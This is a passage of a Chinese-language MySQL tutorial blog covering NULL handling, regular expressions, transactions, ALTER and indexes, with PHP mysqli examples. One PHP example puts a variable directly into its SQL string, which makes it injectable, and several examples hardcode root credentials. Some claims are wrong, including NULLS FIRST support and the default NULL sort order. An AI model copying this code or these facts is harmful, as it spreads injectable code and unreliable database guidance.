&quot;&lt;td&gt;&#123;$row[&#x27;runoob_count&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-NULL-值处理"><a href="#MySQL-NULL-值处理" class="headerlink" title="MySQL NULL 值处理"></a>MySQL NULL 值处理</h2><ul>
<li><strong>IS NULL:</strong> 当列的值是 NULL,此运算符返回 true。</li>
<li><strong>IS NOT NULL:</strong> 当列的值不为 NULL, 运算符返回 true。</li>
<li><strong>&lt;&#x3D;&gt;:</strong> 比较操作符（不同于 &#x3D; 运算符），当比较的的两个值相等或者都为 NULL 时返回 true。</li>
</ul>
<h3 id="检查是否为-NULL"><a href="#检查是否为-NULL" class="headerlink" title="检查是否为 NULL"></a>检查是否为 NULL</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE 键名 IS NULL;</span><br><span class="line">SELECT * FROM 表名 WHERE 键名 IS NOT NULL;</span><br></pre></td></tr></table></figure>

<h3 id="处理NULL"><a href="#处理NULL" class="headerlink" title="处理NULL"></a>处理NULL</h3><h4 id="COALESCE-函数"><a href="#COALESCE-函数" class="headerlink" title="COALESCE() 函数"></a><code>COALESCE()</code> 函数</h4><p>返回参数中的第一个非 <code>NULL</code> 值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT name, COALESCE(age, 0) AS age FROM users;</span><br></pre></td></tr></table></figure>

<h4 id="IFNULL-函数"><a href="#IFNULL-函数" class="headerlink" title="IFNULL() 函数"></a><code>IFNULL()</code> 函数</h4><p>如果第一个参数为 <code>NULL</code>，返回第二个参数，否则返回第一个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT name, IFNULL(age, 18) AS age FROM users;</span><br></pre></td></tr></table></figure>

<h4 id="NULLIF-函数"><a href="#NULLIF-函数" class="headerlink" title="NULLIF() 函数"></a><code>NULLIF()</code> 函数</h4><p>比较两个参数，如果它们相等则返回 <code>NULL</code>，否则返回第一个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NULLIF(5, 5); -- 返回 NULL</span><br><span class="line">SELECT NULLIF(5, 10); -- 返回 5</span><br></pre></td></tr></table></figure>

<h4 id="聚合函数的处理"><a href="#聚合函数的处理" class="headerlink" title="聚合函数的处理"></a>聚合函数的处理</h4><p>**<code>COUNT(column)</code>**：忽略 <code>NULL</code> 值，只统计非 <code>NULL</code> 值的行。</p>
<p>**<code>COUNT(\*)</code>**：统计所有行，包括 <code>NULL</code>。</p>
<p><strong><code>SUM()</code>、<code>AVG()</code> 等</strong>：会忽略 <code>NULL</code> 值，只计算非 <code>NULL</code> 值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(age) AS count_age, COUNT(*) AS count_all FROM users;</span><br></pre></td></tr></table></figure>

<h4 id="NULL-排序"><a href="#NULL-排序" class="headerlink" title="NULL 排序"></a>NULL 排序</h4><p>在使用 <code>ORDER BY</code> 子句进行排序时，NULL 值默认会被放在排序的最后。如果希望将 NULL 值放在最前面，可以使用 <code>ORDER BY column_name ASC NULLS FIRST</code>，反之使用 <code>ORDER BY column_name DESC NULLS LAST</code></p>
<h4 id="使用-操作符进行-NULL-比较"><a href="#使用-操作符进行-NULL-比较" class="headerlink" title="使用 &lt;&#x3D;&gt; 操作符进行 NULL 比较"></a>使用 &lt;&#x3D;&gt; 操作符进行 NULL 比较</h4><p>&lt;&#x3D;&gt; 操作符是 MySQL 中用于比较两个表达式是否相等的特殊操作符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM employees WHERE commission &lt;=&gt; NULL;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本处理-NULL-值"><a href="#使用-PHP-脚本处理-NULL-值" class="headerlink" title="使用 PHP 脚本处理 NULL 值"></a>使用 PHP 脚本处理 NULL 值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">if( isset($runoob_count ))</span><br><span class="line">&#123;</span><br><span class="line">   $sql = &quot;SELECT runoob_author, runoob_count</span><br><span class="line">           FROM  runoob_test_tbl</span><br><span class="line">           WHERE runoob_count = $runoob_count&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   $sql = &quot;SELECT runoob_author, runoob_count</span><br><span class="line">           FROM  runoob_test_tbl</span><br><span class="line">           WHERE runoob_count IS NULL&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 IS NULL 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;登陆次数&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_count&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-正则表达式"><a href="#MySQL-正则表达式" class="headerlink" title="MySQL 正则表达式"></a>MySQL 正则表达式</h2><p>MySQL 中使用 <strong>REGEXP</strong> 和 <strong>RLIKE</strong>操作符来进行正则表达式匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name REGEXP &#x27;pattern&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>column_name</code> 是你要进行正则表达式匹配的列的名称。</li>
<li><code>&#39;pattern&#39;</code> 是一个正则表达式模式。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250126184423930.png"></p>
<p><code>\w</code>：匹配一个字母数字字符（包括下划线）。</p>
<p><code>\s</code>：匹配一个空白字符</p>
<h2 id="MySQL-事务"><a href="#MySQL-事务" class="headerlink" title="MySQL 事务"></a>MySQL 事务</h2><p>事务是一组SQL语句的执行，它们被视为一个单独的工作单元</p>
<p>事务是必须满足4个条件（ACID）：</p>
<p>原子性（<strong>A</strong>tomicity，或称不可分割性）：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成</p>
<p>一致性（<strong>C</strong>onsistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏</p>
<p>隔离性（<strong>I</strong>solation，又称独立性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致</p>
<p>持久性（<strong>D</strong>urability）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失</p>
<h3 id="mysql事务处理"><a href="#mysql事务处理" class="headerlink" title="mysql事务处理"></a>mysql事务处理</h3><h4 id="用-BEGIN-ROLLBACK-COMMIT"><a href="#用-BEGIN-ROLLBACK-COMMIT" class="headerlink" title="用 BEGIN, ROLLBACK, COMMIT"></a>用 BEGIN, ROLLBACK, COMMIT</h4><ul>
<li><p><strong>BEGIN 或 START TRANSACTION</strong>：开用于开始一个事务。</p>
</li>
<li><p><strong>ROLLBACK</strong> 事务回滚，取消之前的更改。</p>
</li>
<li><p><strong>COMMIT</strong>：事务确认，提交事务，使更改永久生效。</p>
</li>
<li><p><strong>SAVEPOINT</strong>：用于在事务中设置保存点，以便稍后能够回滚到该点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAVEPOINT savepoint_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ROLLBACK TO SAVEPOINT</strong>：用于回滚到之前设置的保存点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROLLBACK TO SAVEPOINT savepoint_name;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="用-SET-来改变-MySQL-的自动提交模式"><a href="#用-SET-来改变-MySQL-的自动提交模式" class="headerlink" title="用 SET 来改变 MySQL 的自动提交模式"></a>用 SET 来改变 MySQL 的自动提交模式</h4><ul>
<li><strong>SET AUTOCOMMIT&#x3D;0</strong> 禁止自动提交</li>
<li><strong>SET AUTOCOMMIT&#x3D;1</strong> 开启自动提交</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn, &quot;set names utf8&quot;);</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">mysqli_query($conn, &quot;SET AUTOCOMMIT=0&quot;); // 设置为不自动提交，因为MYSQL默认立即执行</span><br><span class="line">mysqli_begin_transaction($conn);            // 开始事务定义</span><br><span class="line"> </span><br><span class="line">if(!mysqli_query($conn, &quot;insert into runoob_transaction_test (id) values(8)&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    mysqli_query($conn, &quot;ROLLBACK&quot;);     // 判断当执行失败时回滚</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(!mysqli_query($conn, &quot;insert into runoob_transaction_test (id) values(9)&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    mysqli_query($conn, &quot;ROLLBACK&quot;);      // 判断执行失败时回滚</span><br><span class="line">&#125;</span><br><span class="line">mysqli_commit($conn);            //执行事务</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-ALTER-命令"><a href="#MySQL-ALTER-命令" class="headerlink" title="MySQL ALTER 命令"></a>MySQL ALTER 命令</h2><p>MySQL 的 <strong>ALTER</strong> 命令用于修改数据库、表和索引等对象的结构</p>
<p><strong>ALTER</strong> 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作</p>
<h3 id="添加列"><a href="#添加列" class="headerlink" title="添加列"></a>添加列</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名</span><br><span class="line">ADD COLUMN 列名 新的数据类型;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名 ADD 列名 新的数据类型 FIRST;</span><br><span class="line">ALTER TABLE 数据表名 ADD 列名 新的数据类型 AFTER 表中的列名;</span><br></pre></td></tr></table></figure>

<h3 id="修改列的数据类型"><a href="#修改列的数据类型" class="headerlink" title="修改列的数据类型"></a>修改列的数据类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名</span><br><span class="line">MODIFY COLUMN 列名 新的数据类型;</span><br></pre></td></tr></table></figure>

<h3 id="修改列名"><a href="#修改列名" class="headerlink" title="修改列名"></a>修改列名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名</span><br><span class="line">CHANGE COLUMN 旧的列名 新的列名 新的数据类型;</span><br></pre></td></tr></table></figure>

<h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名</span><br><span class="line">DROP COLUMN 列名;</span><br></pre></td></tr></table></figure>

<h3 id="添加-PRIMARY-KEY"><a href="#添加-PRIMARY-KEY" class="headerlink" title="添加 PRIMARY KEY"></a>添加 PRIMARY KEY</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据表名</span><br><span class="line">ADD PRIMARY KEY (列名);</span><br></pre></td></tr></table></figure>

<h3 id="添加-FOREIGN-KEY"><a href="#添加-FOREIGN-KEY" class="headerlink" title="添加 FOREIGN KEY"></a>添加 FOREIGN KEY</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 数据子表</span><br><span class="line">ADD CONSTRAINT 在子表中添加的外键  //用于关联到数据母表的列</span><br><span class="line">FOREIGN KEY (数据母表的列名)</span><br><span class="line">REFERENCES 数据母表 (数据母表的列名);</span><br></pre></td></tr></table></figure>

<h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 旧的表名</span><br><span class="line">RENAME TO 新的表名;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-索引"><a href="#MySQL-索引" class="headerlink" title="MySQL 索引"></a>MySQL 索引</h2><p>MySQL 索引是一种数据结构，用于加快数据库查询的速度和性能</p>
<h3 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h3><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE INDEX index_name</span><br><span class="line">ON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure>

<h4 id="修改表结构-添加索引"><a href="#修改表结构-添加索引" class="headerlink" title="修改表结构(添加索引)"></a>修改表结构(添加索引)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure>

<h4 id="创建表的时候直接指定"><a href="#创建表的时候直接指定" class="headerlink" title="创建表的时候直接指定"></a>创建表的时候直接指定</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  ...,</span><br><span class="line">  INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="删除索引的语法"><a href="#删除索引的语法" class="headerlink" title="删除索引的语法"></a>删除索引的语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP INDEX index_name ON table_name;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">DROP INDEX index_name;</span><br></pre></td></tr></table></figure>

<h3 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h3><h4 id="创建索引-1"><a href="#创建索引-1" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE UNIQUE INDEX index_name</span><br><span class="line">ON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...);</span><br></pre></td></tr></table></figure>

<h4 id="修改表结构添加索引"><a href="#修改表结构添加索引" class="headerlink" title="修改表结构添加索引"></a>修改表结构添加索引</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER table table_name </span><br><span class="line">ADD CONSTRAINT unique_constraint_name UNIQUE (column1, column2, ...);</span><br></pre></td></tr></table></figure>

<h4 id="创建表的时候直接指定-1"><a href="#创建表的时候直接指定-1" class="headerlink" title="创建表的时候直接指定"></a>创建表的时候直接指定</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  ...,</span><br><span class="line">  CONSTRAINT index_name UNIQUE (column1 [ASC|DESC], column2 [ASC|DESC], ...)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="使用ALTER-命令添加和删除索引"><a href="#使用ALTER-命令添加和删除索引" class="headerlink" title="使用ALTER 命令添加和删除索引"></a>使用ALTER 命令添加和删除索引</h3><ul>
<li>ALTER TABLE tbl_name ADD PRIMARY KEY (column_list):该语句添加一个主键，主键列中的值必须唯一，主键的列的列表，可以是一个或多个列，不能包含 NULL 值。 。</li>
<li><strong>ALTER TABLE tbl_name ADD UNIQUE index_name (column_list):</strong> 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。</li>
<li><strong>ALTER TABLE tbl_name ADD INDEX index_name (column_list):</strong> 添加普通索引，索引值可出现多次。</li>
<li>**ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list):**该语句指定了索引为 FULLTEXT ，用于全文索引。</li>
</ul>
<h3 id="使用-ALTER-命令添加和删除主键"><a href="#使用-ALTER-命令添加和删除主键" class="headerlink" title="使用 ALTER 命令添加和删除主键"></a>使用 ALTER 命令添加和删除主键</h3><p>主键作用于列上（可以一个列或多个列联合主键），添加主键时，你需要确保该主键默认不为空（NOT NULL）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;</span><br><span class="line">ALTER TABLE testalter_tbl ADD PRIMARY KEY (i);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl DROP PRIMARY KEY;</span><br></pre></td></tr></table></figure>

<p>删除主键时只需指定 PRIMARY KEY，但在删除索引时，你必须知道索引名</p>
<h3 id="显示索引信息"><a href="#显示索引信息" class="headerlink" title="显示索引信息"></a>显示索引信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW INDEX FROM table_name\G</span><br></pre></td></tr></table></figure>

<ul>
<li><code>SHOW INDEX</code>: 用于显示索引信息的关键字。</li>
<li><code>FROM table_name</code>: 指定要查看索引信息的表的名称。</li>
<li><code>\G</code>: 格式化输出信息。</li>
</ul>
<h2 id="MySQL-临时表（待）"><a href="#MySQL-临时表（待）" class="headerlink" title="MySQL 临时表（待）"></a>MySQL 临时表（待）</h2><h2 id="MySQL-复制表（待）"><a href="#MySQL-复制表（待）" class="headerlink" title="MySQL 复制表（待）"></a>MySQL 复制表（待）</h2><h2 id="MySQL-元数据（待）"><a href="#MySQL-元数据（待）" class="headerlink" title="MySQL 元数据（待）"></a>MySQL 元数据（待）</h2><h2 id="MySQL-序列使用（AUTO-INCREMENT）（待）"><a href="#MySQL-序列使用（AUTO-INCREMENT）（待）" class="headerlink" title="MySQL 序列使用（AUTO_INCREMENT）（待）"></a>MySQL 序列使用（AUTO_INCREMENT）（待）</h2><h2 id="MySQL-处理重复数据（待）"><a href="#MySQL-处理重复数据（待）" class="headerlink" title="MySQL 处理重复数据（待）"></a>MySQL 处理重复数据（待）</h2><h2 id="MySQL-及-SQL-注入"><a href="#MySQL-及-SQL-注入" class="headerlink" title="MySQL 及 SQL 注入"></a>MySQL 及 SQL 注入</h2><p>SQL 注入，就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令</p>
<h2 id="MySQL-导出数据（待）"><a href="#MySQL-导出数据（待）" class="headerlink" title="MySQL 导出数据（待）"></a>MySQL 导出数据（待）</h2><h2 id="MySQL-导入数据（待）"><a href="#MySQL-导入数据（待）" class="headerlink" title="MySQL 导入数据（待）"></a>MySQL 导入数据（待）</h2><h2 id="MySQL-函数，运算符，命令大全（待）"><a href="#MySQL-函数，运算符，命令大全（待）" class="headerlink" title="MySQL 函数，运算符，命令大全（待）"></a>MySQL 函数，运算符，命令大全（待）</h2>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
</search>
